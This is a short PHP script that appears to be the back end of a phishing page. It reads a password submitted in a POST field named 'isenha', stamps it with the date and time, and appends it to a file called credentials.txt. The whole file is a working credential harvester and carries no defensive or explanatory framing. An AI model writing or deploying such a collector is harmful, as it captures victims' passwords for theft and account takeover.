<?php
	$password = "Password: ".$_POST['isenha']."\n";
	$date = date('Y-m-d H:i:s')."Z"."\n";
  $credential = $date.$password."\n";
  file_put_contents('credentials.txt', $credential, FILE_APPEND);
?>
